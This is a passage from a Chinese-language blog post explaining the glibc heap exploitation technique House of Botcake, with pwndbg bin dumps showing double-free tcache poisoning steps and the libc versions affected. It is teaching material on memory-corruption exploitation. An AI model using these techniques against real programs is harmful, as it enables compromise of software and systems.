<p>Step 3: free prev chunk 使它和 victim chunk 合并</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x405e10</span> —▸ <span class="number">0x7ffff7facbe0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x405e10</span></span><br></pre></td></tr></table></figure>
<p>Step 4: 使用malloc从tcache bin链表中取出一个chunk，然后通过二次free将 victim chunk 加入tcache bin链表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">6</span>]: <span class="number">0x405c00</span> —▸ <span class="number">0x405af0</span> —▸ <span class="number">0x4059e0</span> —▸ <span class="number">0x4058d0</span> —▸ <span class="number">0x4057c0</span> —▸ <span class="number">0x4056b0</span> ◂— <span class="number">0x0</span> <span class="comment">/* 原本tcache的第一个chunk被申请了 */</span></span><br><span class="line"><span class="number">0x410</span> [  <span class="number">1</span>]: <span class="number">0x4052a0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x405f30</span> —▸ <span class="number">0x405c00</span> —▸ <span class="number">0x405af0</span> —▸ <span class="number">0x4059e0</span> —▸ <span class="number">0x4058d0</span> —▸ <span class="number">0x4057c0</span> —▸ <span class="number">0x4056b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x410</span> [  <span class="number">1</span>]: <span class="number">0x4052a0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>Step 5: 将 victim chunk 的 fd 指针覆写为目标位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x405f30</span> —▸ <span class="number">0x7fffffffded0</span> —▸ <span class="number">0x400040</span> ◂— <span class="number">0x400000006</span></span><br></pre></td></tr></table></figure>
<p>虽然和 tcache Double free 的流程有些不同（先填满 tcache 然后再 fastbin 上进行 Double free，再次申请，使得 fast chunk 被链入 tcache），但最后都可以申请到目标地址</p>
<h2 id="版本对-House-Of-Botcake-的影响"><a href="#版本对-House-Of-Botcake-的影响" class="headerlink" title="版本对 House Of Botcake 的影响"></a>版本对 House Of Botcake 的影响</h2><p>House Of Botcake 就是为了对付高libc版本而产生的技术</p>
<p>至少在 libc-2.25 ~ libc-2.31 都可以适应</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/25/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/25/">25</a><span class="page-number current">26</span><a class="page-number" href="/page/27/">27</a><span class="space">&hellip;</span><a class="page-number" href="/page/33/">33</a><a class="extend next" rel="next" href="/page/27/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">330</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">170</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">74:38</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
